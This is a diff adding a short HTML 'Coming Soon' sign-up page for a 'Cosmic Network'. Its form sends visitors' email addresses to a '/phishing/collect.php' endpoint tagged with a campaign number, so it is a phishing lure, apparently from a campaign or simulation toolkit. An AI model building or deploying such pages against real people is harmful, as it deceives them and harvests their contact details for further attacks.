@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Landing</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        /* similar to index but with email-only form */
+        :root {
+            --cosmic-neon-green: #00ff9d;
+        }
+        body { background:#0a0a0f; color:#0ff; font-family:'Share Tech Mono',monospace; padding:20px; }
+        .container { max-width:600px; margin:0 auto; text-align:center; }
+        .glass-panel { background:rgba(0,20,40,0.7); backdrop-filter:blur(10px); border:1px solid #0ff; border-radius:16px; padding:40px; }
+        h1 { color:#0ff; margin-bottom:20px; }
+        p { color:#ccc; margin-bottom:30px; }
+        input { width:80%; padding:12px; background:#000; color:#0ff; border:1px solid #0ff; border-radius:30px; margin-bottom:20px; }
+        .btn { background:transparent; color:#0ff; border:2px solid #0ff; padding:12px 30px; border-radius:40px; cursor:pointer; }
+        .btn:hover { background:#0ff; color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="glass-panel">
+            <h1>🚀 COMING SOON</h1>
+            <p>Sign up for early access to the Cosmic Network.</p>
+            <form action="/phishing/collect.php?campaign=1" method="post">
+                <input type="hidden" name="page" value="landing_page">
+                <input type="email" name="email" placeholder="Your email address" required>
+                <button type="submit" class="btn">NOTIFY ME</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
